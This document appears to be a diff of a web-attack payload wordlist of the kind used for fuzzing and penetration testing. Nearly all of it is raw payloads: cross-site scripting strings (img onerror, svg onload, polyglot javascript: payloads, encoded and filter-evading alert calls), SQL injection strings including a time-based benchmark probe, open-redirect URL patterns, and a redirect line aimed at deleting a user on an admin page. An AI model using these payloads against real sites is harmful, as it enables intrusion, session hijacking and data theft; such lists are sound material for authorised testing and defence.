@@ -1,43 +1,25 @@
-Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
-<A HREF="http://66.102.7.147/">XSS</A>
-<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
-<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
-id="x">x</div>
-</div>
-function makePopups(){
-    for (i=1;i<6;i++) {
-        window.open('popup.html','spam'+i,'width=50,height=50');
-</body>
-<div id="123"><span class=foo>Some text</span>
-  id    ID    #REQUIRED>]>
-        </xsl:template>
-    <circle fill="red" r="40"></circle>
-Same effect with
--->
-<math>
-<div id="131"><b>drag and drop one of the following strings to the drop box:</b>
-<br/><hr/>
-<br/><hr/>
-<br/><hr/>
-<br/><hr/>
-<br/><hr/>
-<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>
-<br>
-<input name="secret" type="password">
-</image>
-<div id="134"><xmp>
-<%
-</xmp>
-x='<%'
-XXX
--->{}
-</template>
-<input name="username" value="admin" />
-<input name="password" type="password" value="secret" />
-<input type="submit">
 <circle r="400"></circle>
+<div id="131"><b>drag and drop one of the following strings to the drop box:</b>
+<div id="134"><xmp>
+<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
+<img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<img src=x:alert(alt) onerror=eval(src) alt=xss>
+<input name="password" type="password" value="secret" />
+<input name="secret" type="password">
+<input name="username" value="admin" />
+<input type="submit">
+<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>
+<svg onload=alert(1)>
+<svg id=alert(1) onload=eval(id)>
+<svg/onload=alert('XSS')>
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<x %6Fnxxx=1
 Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
-<A HREF="http://66.102.7.147/">XSS</A>
+[1].find(alert)
+a=alert,a(1)
+alert&lpar;1&rpar;
+alert`1`
+navigator.vibrate(500)
 onBeforeActivate
 onBeforeCopy
 onBeforeCut
@@ -132,24 +114,6 @@ onTrackChange
 onURLFlip
 onUndo
 onUnload
-seekSegmentTime
-alert`1`
-alert&lpar;1&rpar;
-(alert)(1)
-a=alert,a(1)
-[1].find(alert)
-navigator.vibrate(500)
-<%78 onxxx=1
-<x %6Fnxxx=1
-<img src=x onerror=alert(String.fromCharCode(88,83,83));>
-<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
-<img src=x:alert(alt) onerror=eval(src) alt=xss>
-"><img src=x onerror=alert('XSS');>
-"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
-<svgonload=alert(1)>
-<svg/onload=alert('XSS')>
-<svg/onload=alert(String.fromCharCode(88,83,83))>
-<svg id=alert(1) onload=eval(id)>
 onbounce
 oncanplay
 oncanplaythrough
@@ -198,3 +162,39 @@ onpaste
 onpause
 onplaying
 onpointerdown
+seekSegmentTime
+x='<%'
+<video onloadstart=alert(1)><source>
+<input autofocus onblur=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<form onsubmit=alert(1)><input type=submit>
+<select onchange=alert(1)><option>1<option>2
+<menu id=x contextmenu=x onshow=alert(1)>right click me!
+<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+ontouchstart
+ontransitioncancel
+/.example.com
+///\;@example.com
+' and 'one'='one
+' and 'one'='one–
+' group by password having 1=1--
+' group by userid having 1=1--
+' group by username having 1=1--
+ like '%'
+ %' AND 8310=8311 AND '%'='
+ and (select substring(@@version,1,1))='X'
+ " and 0=benchmark(3000000,MD5(1))%20/*
+/?url=/\/example.com&next=/\/example.com&redirect=/\/example.com
+/redirect?url=http://example.com&next=http://example.com&redirect=http://example.com&redir=http://example.com&rurl=http://example.com
+/redirect?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com
+/redirect?url=/\/example.com&next=/\/example.com&redirect=/\/example.com&redir=/\/example.com&rurl=/\/example.com
